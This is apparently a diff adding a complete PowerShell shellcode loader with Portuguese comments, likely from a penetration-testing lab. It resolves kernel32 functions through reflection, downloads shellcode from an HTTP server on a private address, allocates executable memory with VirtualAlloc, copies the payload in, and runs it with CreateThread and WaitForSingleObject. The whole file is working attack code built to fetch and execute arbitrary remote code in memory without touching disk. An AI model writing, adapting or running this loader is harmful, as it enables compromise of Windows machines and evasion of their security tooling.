@@ -1,0 +1,98 @@
+function LookupFunc {
+    Param ($moduleName, $functionName)
+ 
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+ 
+    $tmp = @()
+    $assem.GetMethods() | ForEach-Object {
+        if ($_.Name -eq "GetProcAddress") { $tmp += $_ }
+    }
+ 
+    return $tmp[0].Invoke(
+        $null,
+        @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)
+    )
+}
+ 
+function getDelegateType {
+    Param (
+        [Parameter(Mandatory = $true)] [Type[]] $func,
+        [Parameter(Mandatory = $true)] [Type] $ret
+    )
+ 
+    $domain = [AppDomain]::CurrentDomain
+    $name = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $assembly = $domain.DefineDynamicAssembly($name, 'Run')
+    $module = $assembly.DefineDynamicModule('InMemoryModule', $false)
+ 
+    $type = $module.DefineType(
+        'MyDelegateType',
+        'Class, Public, Sealed, AnsiClass, AutoClass',
+        [System.MulticastDelegate]
+    )
+ 
+    $type.DefineConstructor(
+        'RTSpecialName, HideBySig, Public',
+        [System.Reflection.CallingConventions]::Standard,
+        $func
+    ).SetImplementationFlags('Runtime, Managed')
+ 
+    $type.DefineMethod(
+        'Invoke',
+        'Public, HideBySig, NewSlot, Virtual',
+        $ret,
+        $func
+    ).SetImplementationFlags('Runtime, Managed')
+ 
+    return $type.CreateType()
+}
+ 
+# Baixar shellcode
+$url = "http://192.168.45.242/shellcode.bin"
+$wc = New-Object System.Net.WebClient
+$buf = $wc.DownloadData($url)
+ 
+Write-Host "[*] Shellcode baixado: $($buf.Length) bytes"
+ 
+# Alocar memória com tamanho REAL do shellcode
+$bufSize = $buf.Length
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (LookupFunc kernel32.dll VirtualAlloc),
+    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
+).Invoke([IntPtr]::Zero, $bufSize, 0x3000, 0x40)
+ 
+Write-Host "[*] Memória alocada: 0x$($lpMem.ToString('X'))"
+ 
+# Inserir shellcode
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $bufSize)
+ 
+Write-Host "[*] Shellcode copiado"
+ 
+# Garantir execução com VirtualProtect
+$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (LookupFunc kernel32.dll VirtualProtect),
+    (getDelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool]))
+).Invoke($lpMem, $bufSize, 0x40, [ref]0)
+ 
+Write-Host "[*] VirtualProtect: $VirtualProtect"
+ 
+# Pequeno delay
+Start-Sleep -Milliseconds 100
+ 
+# Criar thread
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (LookupFunc kernel32.dll CreateThread),
+    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
+).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+ 
+Write-Host "[*] Thread criada: 0x$($hThread.ToString('X'))"
+ 
+# Esperar execução
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (LookupFunc kernel32.dll WaitForSingleObject),
+    (getDelegateType @([IntPtr], [Int32]) ([Int]))
+).Invoke($hThread, 0xFFFFFFFF)
+ 
+Write-Host "[*] Executado"
